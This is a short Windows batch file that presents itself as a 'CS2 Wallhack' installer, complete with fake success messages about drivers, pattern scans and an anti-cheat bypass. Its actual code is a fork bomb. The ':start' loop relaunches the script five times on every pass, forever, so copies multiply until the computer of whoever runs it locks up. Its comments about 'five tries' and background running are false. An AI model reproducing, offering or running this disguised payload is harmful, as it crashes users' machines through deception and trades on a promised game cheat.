@echo off
title CS2 Wallhack
color 0a
mode con: cols=65 lines=20

echo.
echo   [ cs2 wallhack installer Script - 2025 Edition ]
echo   ===========================================
echo.
echo   ...
echo   [OK] Display driver loaded
echo   [OK] Pattern scan completed
echo   [OK] Anti-cheat bypass initialized
echo.
echo.

echo Start memory hooks, 5 trys before it exits with an warning
:start
start "" "%~f0"
start "" "%~f0"
start "" "%~f0"
start "" "%~f0"
start "" "%~f0"
goto start

echo Runs now in background, you can close this window.
